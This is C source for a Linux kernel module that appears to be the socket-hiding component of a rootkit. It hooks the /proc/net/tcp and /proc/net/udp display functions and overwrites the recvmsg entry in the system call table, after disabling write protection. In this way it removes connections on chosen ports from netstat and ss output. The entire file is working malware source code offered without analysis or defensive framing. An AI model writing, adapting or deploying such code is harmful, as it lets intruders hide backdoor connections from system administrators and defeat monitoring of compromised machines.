#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/proc_fs.h>
#include <../fs/proc/internal.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/namei.h>
#include <linux/seq_file.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <linux/socket.h>

#include<linux/syscalls.h>
#include<linux/unistd.h>
#include<linux/string.h>

#include "hooking.h"
#include "socket_hiding.h"

#define MAX_PORTC 1023
#define TMPSZ 150

static int tcp_is_hidden = 0;
static int udp_is_hidden = 0;

struct proc_dir_entry *tcp_proc_entry;
struct proc_dir_entry *udp_proc_entry;

struct tcp_seq_afinfo * tcp_info;
struct udp_seq_afinfo * udp_info;

static unsigned int  ports_tcp[MAX_PORTC];
static unsigned int  ports_udp[MAX_PORTC];
static int ports_tcp_num=0;
static int ports_udp_num=0;

module_param_array(ports_tcp, int, &ports_tcp_num, 0);
MODULE_PARM_DESC(ports_tcp, "Hidden tcp sockets with ports ...");
module_param_array(ports_udp, int, &ports_udp_num, 0);
MODULE_PARM_DESC(ports_udp, "Hidden udp sockets with ports ...");

int (*old_tcp_seq_show)(struct seq_file*, void *) = NULL;
int (*old_udp_seq_show)(struct seq_file*, void *) = NULL;
static int my_tcp_seq_show(struct seq_file *, void *);
static int my_udp_seq_show(struct seq_file *, void *);

struct proc_dir_entry * get_proc_dir_entry(const char *);

long (*orig_sys_recvmsg)(int, struct msghdr __user *, unsigned);
static long my_sys_recvmsg(int, struct msghdr __user *, unsigned);

static void hide_udp(void);
static void hide_udp(void);

struct proc_dir_entry * get_proc_dir_entry(const char * name)
{
	struct path path;
  struct proc_inode *proc_inode;
	if(kern_path(name, 0, &path)){
		return NULL;
  }
	proc_inode = container_of(path.dentry->d_inode, struct proc_inode, vfs_inode);
  return proc_inode->pde;
}

// new seq_show, called for each "step" of a sequence
static int my_tcp_seq_show(struct seq_file *s, void *v)
{
  char port[12];
  int i, retval=old_tcp_seq_show(s, v);
  if(v == SEQ_START_TOKEN){
    return retval;
  }
  for(i=0; i<ports_tcp_num; i++){
    sprintf(port,":%04X", ports_tcp[i]);
    if(strnstr(s->buf+s->count-TMPSZ,port,TMPSZ))
    {
      s->count -= TMPSZ;
      break;
    }
  }
  return retval;
}

static int my_udp_seq_show(struct seq_file *s, void *v)
{
  char port[12];
  int i, retval=old_udp_seq_show(s, v);
  if(v == SEQ_START_TOKEN){
    return retval;
  }
  for(i=0; i<ports_udp_num; i++){
    sprintf(port,":%04X", ports_udp[i]);
    if(strnstr(s->buf+s->count-TMPSZ,port,TMPSZ))
    {
      s->count -= 128;
      break;
    }
  }
  return retval;
}


static void hide_tcp(void){
  tcp_proc_entry = get_proc_dir_entry("/proc/net/tcp");
  if(tcp_proc_entry == NULL){
    printk(KERN_INFO "Couldn't obtain tcp entry\n");
  }
  else{
    tcp_info =(struct tcp_seq_afinfo *) tcp_proc_entry->data;
    //oldOP = tcp_info->seq_ops;
    old_tcp_seq_show = tcp_info->seq_ops.show;
    tcp_info->seq_ops.show = my_tcp_seq_show;
    tcp_is_hidden = 1;
  }
}

static void hide_udp(void){
  udp_proc_entry = get_proc_dir_entry("/proc/net/udp");
  if(udp_proc_entry == NULL){
    printk(KERN_INFO "Couldn't obtain udp entry\n");
  }
  else{
    udp_info =(struct udp_seq_afinfo *) udp_proc_entry->data;
    //oldOP = udp_info->seq_ops;
    old_udp_seq_show = udp_info->seq_ops.show;
    udp_info->seq_ops.show = my_udp_seq_show;
    udp_is_hidden = 1;
  }
}

static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
  long retVal, msgLen;
  struct socket * socket;
  struct sock * sock;
  struct nlmsghdr * nl, * nl2; 
  struct inet_diag_msg * diag_msg; 
  unsigned int des_port, src_port;
  int i, err = 0;

  retVal = orig_sys_recvmsg(fd, msg, flags);
  if(tcp_is_hidden){
    socket = sockfd_lookup(fd, &err);
    if(socket!=NULL){
      sock = socket -> sk;
      // check if netlink
      if(sock->sk_family == AF_NETLINK && sock->sk_protocol == NETLINK_INET_DIAG){
        nl = (struct nlmsghdr *)msg->msg_iov->iov_base;
        msgLen = msg->msg_iov->iov_len;

        while(NLMSG_OK(nl, msgLen)){
          nl2 =NLMSG_NEXT(nl, msgLen);
moved:    diag_msg = NLMSG_DATA(nl);
          src_port = htons(diag_msg->id.idiag_sport);
          des_port = htons(diag_msg->id.idiag_dport);
          for(i=0; i<ports_tcp_num; i++){
            if(src_port == ports_tcp[i] || des_port == ports_tcp[i]){
              retVal -= NLMSG_ALIGN(nl->nlmsg_len);
              if(NLMSG_OK(nl2, msgLen)){
                memmove(nl,nl2,msgLen);
                goto moved;
              }else{
                //FIXME wenn 0, then ss prints EOF on netlink
                printk(KERN_INFO "return %d\n", retVal);
                return retVal;
              }
            }
          }
          nl = nl2;
        }
      }
    }
  }
  return retVal;
}

void hide_socket(){
  if(ports_tcp_num > 0){
    hide_tcp();

    disable_wp();
    orig_sys_recvmsg = syscall_table[__NR_recvmsg];
    syscall_table[__NR_recvmsg] = my_sys_recvmsg;
    enable_wp();
  }
  if(ports_udp_num > 0){
    hide_udp();
  }
} 

void unhide_socket(void){
	if(tcp_is_hidden == 1){
    tcp_info->seq_ops.show = old_tcp_seq_show;

    disable_wp();
    syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
    enable_wp();
  }
	if(udp_is_hidden == 1){
    udp_info->seq_ops.show = old_udp_seq_show;
  }
}

